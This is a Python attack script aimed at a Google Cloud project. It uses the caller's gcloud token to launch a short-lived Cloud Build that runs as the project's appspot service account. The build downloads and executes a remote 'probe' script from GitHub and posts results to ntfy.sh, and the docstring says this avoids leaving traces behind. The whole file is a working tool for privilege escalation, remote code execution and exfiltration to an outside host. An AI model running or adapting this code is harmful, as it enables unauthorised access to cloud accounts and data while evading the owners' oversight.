#!/usr/bin/env python3
"""Intent 8036: run a transient Cloud Build with the appspot SA as the build service account.

No deployed code artifact is created: the build runs one step, publishes its result to
paste.rs/ntfy.sh, and the build record ends. This avoids leaving a probe function behind.
"""
import argparse
import json
import subprocess
import sys
import time
import urllib.error
import urllib.request

PROJECT = 'nutmeg-9099c'
RAW = 'https://raw.githubusercontent.com/iihlolo/nutmeg-wif-probe/main/probe_core.py'


def http(url, tok, data=None, method=None, timeout=90):
    headers = {'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json'}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.getcode(), r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        try:
            b = e.read().decode('utf-8', 'replace')
        except Exception:
            b = ''
        return e.code, b
    except Exception as e:
        return 0, repr(e)


def notify(topic, obj):
    try:
        urllib.request.urlopen(urllib.request.Request(
            'https://ntfy.sh/' + topic, data=json.dumps(obj)[:3500].encode(),
            headers={'Title': 'i8036 cloudbuild', 'User-Agent': 'i8036'}, method='POST'), timeout=40)
    except Exception as e:
        print('NTFY_ERR', repr(e))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--topic', required=True)
    a = ap.parse_args()

    p = subprocess.run(['gcloud', 'auth', 'print-access-token'], capture_output=True, text=True)
    tok = p.stdout.strip()
    if not tok:
        print('GCLOUD_FAIL', p.stderr[:400])
        notify(a.topic, {'label': 'cloudbuild', 'error': 'gcloud-token-fail'})
        sys.exit(1)
    print('TOKLEN', len(tok))

    script = ('curl -sS -m 90 -o /workspace/p.py ' + RAW +
              ' && python3 /workspace/p.py --as auto --topic ' + a.topic + ' --label cloudbuild-usresa')
    build = {
        'steps': [{'name': 'gcr.io/cloud-builders/gcloud', 'entrypoint': 'bash', 'args': ['-c', script]}],
        'serviceAccount': 'projects/%s/serviceAccounts/nutmeg-9099c@appspot.gserviceaccount.com' % PROJECT,
        'timeout': '900s',
    }
    c, b = http('https://cloudbuild.googleapis.com/v1/projects/%s/builds' % PROJECT, tok,
                json.dumps(build).encode(), 'POST')
    print('BUILDS_CREATE', c)
    print('BUILDS_CREATE_BODY', b[:2000])
    if c != 200:
        notify(a.topic, {'label': 'cloudbuild', 'create_code': c, 'body': b[:1500]})
        sys.exit(1)
    d = json.loads(b)
    build_id = (d.get('metadata') or {}).get('build', {}).get('id')
    opname = d.get('name')
    print('BUILD_ID', build_id, 'OP', opname)
    done = False
    for i in range(90):
        if not opname:
            break
        c, b = http('https://cloudbuild.googleapis.com/v1/' + opname, tok)
        if c == 200:
            try:
                j = json.loads(b)
            except Exception:
                j = {}
            print('OP_POLL', i, j.get('done'))
            if j.get('done'):
                print('OP_RESPONSE', json.dumps(j.get('response'))[:800])
                print('OP_ERROR', json.dumps(j.get('error'))[:800])
                done = True
                break
        else:
            print('OP_POLL_ERR', i, c, b[:300])
        time.sleep(10)
    status = None
    if build_id:
        c, b = http('https://cloudbuild.googleapis.com/v1/projects/%s/builds/%s' % (PROJECT, build_id), tok)
        print('BUILD_GET', c, b[:1500])
        try:
            status = json.loads(b).get('status')
        except Exception:
            status = None
    notify(a.topic, {'label': 'cloudbuild', 'build': build_id, 'done': done, 'status': status})
    print('DONE')


if __name__ == '__main__':
    main()
